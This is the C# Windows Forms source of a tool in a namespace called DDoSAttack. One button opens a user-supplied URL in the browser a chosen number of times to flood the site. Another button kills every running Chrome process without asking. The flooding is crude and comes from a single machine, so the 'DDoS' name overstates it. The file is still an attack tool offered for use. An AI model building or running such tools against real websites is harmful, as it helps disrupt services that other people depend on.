using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Threading;

namespace DDoSAttack
{
    public partial class Form1 : Form
    {
        public List<int> ListOfProcesses;
        public Form1()
        {
            InitializeComponent();
            ListOfProcesses = new List<int>();
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                int times = int.Parse(textBox1.Text);
                String url = textBox2.Text.Trim();
                for (int i = 0; i < times; i++)
                {
                    Process process = new Process();
                    process = Process.Start("explorer", url);
                    if (process != null)
                        this.ListOfProcesses.Add(process.Id);
                    Thread.Sleep(100);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Process[] chromeInstances = Process.GetProcessesByName("chrome");

            foreach (Process p in chromeInstances)
                p.Kill();
        }
    }
}
